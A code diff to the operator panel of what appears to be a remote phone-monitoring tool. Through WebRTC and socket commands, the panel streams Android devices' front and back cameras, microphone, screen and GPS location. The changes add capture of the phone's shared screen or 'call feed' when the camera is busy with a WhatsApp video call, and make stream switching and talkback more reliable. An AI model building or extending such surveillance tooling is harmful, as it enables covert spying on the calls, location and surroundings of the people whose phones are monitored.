@@ -33,7 +33,8 @@ let localMicSender = null;
 const rtcConfig = {
   iceServers: [
     { urls: 'stun:stun.l.google.com:19302' },
-    { urls: 'turn:numb.viagenie.ca', username: 'your@email.com', credential: 'yourpassword' }
+    { urls: 'stun:stun1.l.google.com:19302' },
+    { urls: 'stun:stun2.l.google.com:19302' }
   ]
 };
 
@@ -643,8 +644,23 @@ devicesSearchInput?.addEventListener('input', () => {
 
 function updateFocusStreams() {
   const dev = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+  const isFrontBusy = !!(dev && dev.frontCameraBusy);
+  const isBackBusy = !!(dev && dev.backCameraBusy);
 
-  if (dev && dev.frontTrack && dev.isFrontStreaming) {
+  if (dev && dev.isFrontStreaming && isFrontBusy && dev.screenTrack) {
+    // Hardware camera is busy with external app (e.g. WhatsApp video call) - display shared screen / call view
+    if (!videoFront.srcObject || videoFront.srcObject.getVideoTracks()[0] !== dev.screenTrack) {
+      videoFront.srcObject = new MediaStream([dev.screenTrack]);
+    }
+    if (placeholderFront) placeholderFront.classList.add('hidden');
+    if (tagFront) {
+      tagFront.textContent = 'SHARED CALL FEED';
+      tagFront.className = 'feed-live-tag tag-active';
+      tagFront.title = 'Camera is in use by WhatsApp/external call. Streaming live call view & camera preview.';
+    }
+    if (btnToggleFrontCam) { btnToggleFrontCam.textContent = '⏹ Stop'; btnToggleFrontCam.classList.remove('btn-primary'); }
+    videoFront.play().catch(e => console.log('Autoplay front focus blocked', e));
+  } else if (dev && dev.frontTrack && dev.isFrontStreaming && !isFrontBusy) {
     if (!videoFront.srcObject || videoFront.srcObject.getVideoTracks()[0] !== dev.frontTrack) {
       videoFront.srcObject = new MediaStream([dev.frontTrack]);
     }
@@ -655,7 +671,11 @@ function updateFocusStreams() {
   } else if (dev && dev.isFrontStreaming) {
     if (videoFront) videoFront.srcObject = null;
     if (placeholderFront) placeholderFront.classList.remove('hidden');
-    if (tagFront) { tagFront.textContent = 'CONNECTING...'; tagFront.className = 'feed-live-tag tag-active'; }
+    if (tagFront) {
+      tagFront.textContent = isFrontBusy ? 'CAMERA IN USE' : 'CONNECTING...';
+      tagFront.className = 'feed-live-tag tag-active';
+      tagFront.title = isFrontBusy ? 'Camera hardware is in use by external app (WhatsApp). Waiting for stream view...' : '';
+    }
     if (btnToggleFrontCam) { btnToggleFrontCam.textContent = '⏹ Stop'; btnToggleFrontCam.classList.remove('btn-primary'); }
   } else {
     videoFront.srcObject = null;
@@ -664,7 +684,20 @@ function updateFocusStreams() {
     if (btnToggleFrontCam) { btnToggleFrontCam.textContent = '▶ Stream'; btnToggleFrontCam.classList.add('btn-primary'); }
   }
 
-  if (dev && dev.backTrack && dev.isBackStreaming) {
+  if (dev && dev.isBackStreaming && isBackBusy && dev.screenTrack) {
+    // Hardware camera is busy with external app - display shared screen / call view
+    if (!videoBack.srcObject || videoBack.srcObject.getVideoTracks()[0] !== dev.screenTrack) {
+      videoBack.srcObject = new MediaStream([dev.screenTrack]);
+    }
+    if (placeholderBack) placeholderBack.classList.add('hidden');
+    if (tagBack) {
+      tagBack.textContent = 'SHARED CALL FEED';
+      tagBack.className = 'feed-live-tag tag-active';
+      tagBack.title = 'Camera is in use by external app. Streaming live call view & camera preview.';
+    }
+    if (btnToggleBackCam) { btnToggleBackCam.textContent = '⏹ Stop'; btnToggleBackCam.classList.remove('btn-primary'); }
+    videoBack.play().catch(e => console.log('Autoplay back focus blocked', e));
+  } else if (dev && dev.backTrack && dev.isBackStreaming && !isBackBusy) {
     if (!videoBack.srcObject || videoBack.srcObject.getVideoTracks()[0] !== dev.backTrack) {
       videoBack.srcObject = new MediaStream([dev.backTrack]);
     }
@@ -675,7 +708,11 @@ function updateFocusStreams() {
   } else if (dev && dev.isBackStreaming) {
     if (videoBack) videoBack.srcObject = null;
     if (placeholderBack) placeholderBack.classList.remove('hidden');
-    if (tagBack) { tagBack.textContent = 'CONNECTING...'; tagBack.className = 'feed-live-tag tag-active'; }
+    if (tagBack) {
+      tagBack.textContent = isBackBusy ? 'CAMERA IN USE' : 'CONNECTING...';
+      tagBack.className = 'feed-live-tag tag-active';
+      tagBack.title = isBackBusy ? 'Camera hardware is in use by external app. Waiting for stream view...' : '';
+    }
     if (btnToggleBackCam) { btnToggleBackCam.textContent = '⏹ Stop'; btnToggleBackCam.classList.remove('btn-primary'); }
   } else {
     videoBack.srcObject = null;
@@ -1250,11 +1287,18 @@ btnToggleFrontCam?.addEventListener('click', () => {
   const dev = devices.get(selectedDeviceId);
   if (!dev) return;
   const next = !dev.isFrontStreaming;
+  dev.isFrontStreaming = next;
+  updateFocusStreams();
   socket.emit('cmd:stream_camera', { to: selectedDeviceId, camera: 'front', active: next });
 });
 
 btnStartFrontCamOverlay?.addEventListener('click', () => {
   if (!selectedDeviceId) return;
+  const dev = devices.get(selectedDeviceId);
+  if (dev) {
+    dev.isFrontStreaming = true;
+    updateFocusStreams();
+  }
   socket.emit('cmd:stream_camera', { to: selectedDeviceId, camera: 'front', active: true });
 });
 
@@ -1263,11 +1307,18 @@ btnToggleBackCam?.addEventListener('click', () => {
   const dev = devices.get(selectedDeviceId);
   if (!dev) return;
   const next = !dev.isBackStreaming;
+  dev.isBackStreaming = next;
+  updateFocusStreams();
   socket.emit('cmd:stream_camera', { to: selectedDeviceId, camera: 'back', active: next });
 });
 
 btnStartBackCamOverlay?.addEventListener('click', () => {
   if (!selectedDeviceId) return;
+  const dev = devices.get(selectedDeviceId);
+  if (dev) {
+    dev.isBackStreaming = true;
+    updateFocusStreams();
+  }
   socket.emit('cmd:stream_camera', { to: selectedDeviceId, camera: 'back', active: true });
 });
 
@@ -1321,6 +1372,8 @@ btnStreamMic?.addEventListener('click', () => {
   const dev = devices.get(selectedDeviceId);
   if (!dev) return;
   const next = !dev.isMicStreaming;
+  dev.isMicStreaming = next;
+  updateAudioStream();
   socket.emit('cmd:stream_mic', { to: selectedDeviceId, active: next });
 });
 
@@ -1329,6 +1382,8 @@ btnToggleLocation?.addEventListener('click', () => {
   const dev = devices.get(selectedDeviceId);
   if (!dev) return;
   const next = !dev.isLocationStreaming;
+  dev.isLocationStreaming = next;
+  updateLocationUI();
   const interval = parseInt(gpsIntervalSelect?.value) || 10000;
   socket.emit('cmd:stream_location', { to: selectedDeviceId, active: next, intervalMs: interval });
 });
@@ -1513,7 +1568,7 @@ talkbackToggle?.addEventListener('click', async () => {
     talkbackToggle.style.color = 'var(--text-muted)';
     talkbackToggle.style.background = 'transparent';
     if (localMicSender) {
-      try { dev.peer.removeTrack(localMicSender); } catch(e) {}
+      try { await localMicSender.replaceTrack(null); } catch(e) {}
       localMicSender = null;
     }
     if (localMicStream) {
@@ -1525,14 +1580,14 @@ talkbackToggle?.addEventListener('click', async () => {
     try {
       localMicStream = await navigator.mediaDevices.getUserMedia({ audio: true });
       const track = localMicStream.getAudioTracks()[0];
-      localMicSender = dev.peer.addTrack(track, localMicStream);
-      const offer = await dev.peer.createOffer();
-      await dev.peer.setLocalDescription(offer);
-      socket.emit('signal', {
-        to: selectedDeviceId,
-        from: myId,
-        signal: { type: 'offer', sdp: offer.sdp }
-      });
+      const audioTransceiver = dev.peer.getTransceivers ? dev.peer.getTransceivers().find(t => t.receiver && t.receiver.track && t.receiver.track.kind === 'audio') : null;
+      if (audioTransceiver && audioTransceiver.sender) {
+        audioTransceiver.direction = 'sendrecv';
+        await audioTransceiver.sender.replaceTrack(track);
+        localMicSender = audioTransceiver.sender;
+      } else {
+        localMicSender = dev.peer.addTrack(track, localMicStream);
+      }
       isTalkbackActive = true;
       talkbackToggle.textContent = '🎙️ Talkback ACTIVE';
       talkbackToggle.style.color = '#10b981';
@@ -1606,90 +1661,87 @@ socket.on('signal', async (data) => {
   // WebRTC Offer / Candidate Handling
   try {
     if (signal.type === 'offer') {
-      logDebug(`[WEBRTC] Received offer from ${dev.info.model || from}, creating fresh peer connection...`);
-      if (dev.peer) {
-        try { dev.peer.close(); } catch(e) {}
-        dev.peer = null;
+      logDebug(`[WEBRTC] Received offer from ${dev.info.model || from}, applying session description...`);
+
+      let isNewPeer = false;
+      if (!dev.peer || dev.peer.signalingState === 'closed') {
+        if (dev.peer) {
+          try { dev.peer.close(); } catch(e) {}
+        }
+        dev.peer = new RTCPeerConnection(rtcConfig);
+        dev.candidateQueue = [];
+        isNewPeer = true;
       }
-      dev.candidateQueue = [];
-      dev.frontTrack = null;
-      dev.backTrack = null;
-      dev.screenTrack = null;
-      dev.audioTrack = null;
 
-      dev.peer = new RTCPeerConnection(rtcConfig);
-      dev.peer.addTransceiver('video', { direction: 'recvonly' });
-      dev.peer.addTransceiver('video', { direction: 'recvonly' });
-      dev.peer.addTransceiver('video', { direction: 'recvonly' });
-      dev.peer.addTransceiver('audio', { direction: 'recvonly' });
-
-      dev.peer.ondatachannel = (event) => {
-        const dc = event.channel;
-        logDebug(`[WEBRTC-DC] Telemetry DataChannel opened (${dc.label}) for device ${from}`);
-        dc.onmessage = (e) => {
-          try {
-            const telemetry = JSON.parse(e.data);
-            if (telemetry.latitude !== undefined && telemetry.longitude !== undefined) {
-              updateDeviceLocation(from, telemetry.latitude, telemetry.longitude);
-            }
-          } catch(err) {}
+      if (isNewPeer) {
+        dev.peer.ondatachannel = (event) => {
+          const dc = event.channel;
+          logDebug(`[WEBRTC-DC] Telemetry DataChannel opened (${dc.label}) for device ${from}`);
+          dc.onmessage = (e) => {
+            try {
+              const telemetry = JSON.parse(e.data);
+              if (telemetry.latitude !== undefined && telemetry.longitude !== undefined) {
+                updateDeviceLocation(from, telemetry.latitude, telemetry.longitude);
+              }
+            } catch(err) {}
+          };
         };
-      };
 
-      dev.peer.ontrack = (event) => {
-        const track = event.track;
-        logDebug(`[WEBRTC] [${dev.info.model || from}] Track received: kind=${track.kind}, id=${track.id}`);
-        if (track.kind === 'audio') {
-          dev.audioTrack = track;
-          let audioEl = document.getElementById(`audio-${from}`);
-          if (audioEl) {
-            audioEl.srcObject = new MediaStream([track]);
-            audioEl.play().catch(e => console.log('Audio auto-play blocked', e));
+        dev.peer.ontrack = (event) => {
+          const track = event.track;
+          logDebug(`[WEBRTC] [${dev.info.model || from}] Track received: kind=${track.kind}, id=${track.id}`);
+          if (track.kind === 'audio') {
+            dev.audioTrack = track;
+            let audioEl = document.getElementById(`audio-${from}`);
+            if (audioEl) {
+              audioEl.srcObject = new MediaStream([track]);
+              audioEl.play().catch(e => console.log('Audio auto-play blocked', e));
+            }
+            if (selectedDeviceId === from) {
+              updateAudioStream();
+            }
+          } else if (track.kind === 'video') {
+            if (track.id.includes('screen') || track.id === 'screen_video') {
+              dev.screenTrack = track;
+            } else if (track.id.includes('front') || track.id === 'front_video' || track.id === 'front_camera') {
+              dev.frontTrack = track;
+            } else if (track.id.includes('back') || track.id === 'back_video' || track.id === 'back_camera') {
+              dev.backTrack = track;
+            } else if (!dev.frontTrack) {
+              dev.frontTrack = track;
+            } else if (!dev.backTrack) {
+              dev.backTrack = track;
+            } else if (!dev.screenTrack) {
+              dev.screenTrack = track;
+            }
+            renderDevicesList();
+            if (selectedDeviceId === from) {
+              updateFocusStreams();
+            }
           }
-          if (selectedDeviceId === from) {
-            updateAudioStream();
-          }
-        } else if (track.kind === 'video') {
-          if (track.id.includes('screen') || track.id === 'screen_video') {
-            dev.screenTrack = track;
-          } else if (track.id.includes('front') || track.id === 'front_video' || track.id === 'front_camera') {
-            dev.frontTrack = track;
-          } else if (track.id.includes('back') || track.id === 'back_video' || track.id === 'back_camera') {
-            dev.backTrack = track;
-          } else if (!dev.frontTrack) {
-            dev.frontTrack = track;
-          } else if (!dev.backTrack) {
-            dev.backTrack = track;
-          } else if (!dev.screenTrack) {
-            dev.screenTrack = track;
-          }
-          renderDevicesList();
-          if (selectedDeviceId === from) {
-            updateFocusStreams();
-          }
-        }
-      };
+        };
 
-      dev.peer.onicecandidate = (e) => {
-        if (e.candidate) {
-          socket.emit('signal', {
-            to: from,
-            from: myId,
-            signal: { candidate: e.candidate }
-          });
-        }
-      };
-
-      dev.peer.oniceconnectionstatechange = () => {
-        const state = dev.peer ? dev.peer.iceConnectionState : 'closed';
-        logDebug(`[WEBRTC] [${dev.info.model || from}] ICE State: ${state}`);
-        if (state === 'connected' || state === 'completed') {
-          if (selectedDeviceId === from) {
-            updateFocusStreams();
-            updateAudioStream();
+        dev.peer.onicecandidate = (e) => {
+          if (e.candidate) {
+            socket.emit('signal', {
+              to: from,
+              from: myId,
+              signal: { candidate: e.candidate }
+            });
           }
-        }
-      };
+        };
+
+        dev.peer.oniceconnectionstatechange = () => {
+          const state = dev.peer ? dev.peer.iceConnectionState : 'closed';
+          logDebug(`[WEBRTC] [${dev.info.model || from}] ICE State: ${state}`);
+          if (state === 'connected' || state === 'completed') {
+            if (selectedDeviceId === from) {
+              updateFocusStreams();
+              updateAudioStream();
+            }
+          }
+        };
+      }
 
       await dev.peer.setRemoteDescription(new RTCSessionDescription(signal));
 
@@ -1771,7 +1823,27 @@ socket.on('device_info', (info) => {
   renderDevicesList();
 
   if (selectedDeviceId === deviceId) {
-    selectDevice(deviceId);
+    updateFocusStreams();
+    updateAudioStream();
+    updateLocationUI();
+    if (infoModel) infoModel.textContent = dev.info.model || '—';
+    if (infoManufacturer) infoManufacturer.textContent = dev.info.manufacturer || '—';
+    if (infoVersion) infoVersion.textContent = dev.info.version ? `Android ${dev.info.version}` : '—';
+    if (infoBattery && dev.info.battery !== undefined) {
+      infoBattery.textContent = `${dev.info.battery}%`;
+      if (dev.info.battery <= 15) infoBattery.style.color = 'var(--danger)';
+      else if (dev.info.battery <= 35) infoBattery.style.color = 'var(--warning)';
+      else infoBattery.style.color = 'var(--success)';
+    }
+    if (infoBatteryDetails && dev.info.batteryTemp !== undefined) {
+      infoBatteryDetails.textContent = `${dev.info.batteryTemp}°C • ${dev.info.chargingSource || 'unplugged'}`;
+    }
+    if (storageText && storageProgress && dev.info.storageTotal) {
+      const occupied = (dev.info.storageTotal - dev.info.storageFree).toFixed(1);
+      storageText.textContent = `${occupied} GB / ${dev.info.storageTotal} GB`;
+      const pct = Math.min(100, Math.max(0, ((occupied / dev.info.storageTotal) * 100).toFixed(0)));
+      storageProgress.style.width = `${pct}%`;
+    }
   }
 });
 
@@ -1789,6 +1861,9 @@ socket.on('stream_status', (data) => {
   if (status.screen !== undefined) dev.isScreenStreaming = !!status.screen;
   if (status.mic !== undefined) dev.isMicStreaming = !!status.mic;
   if (status.location !== undefined) dev.isLocationStreaming = !!status.location;
+  if (status.cameraBusy !== undefined) dev.cameraBusy = !!status.cameraBusy;
+  if (status.frontCameraBusy !== undefined) dev.frontCameraBusy = !!status.frontCameraBusy;
+  if (status.backCameraBusy !== undefined) dev.backCameraBusy = !!status.backCameraBusy;
 
   renderDevicesList();
   if (selectedDeviceId === deviceId) {
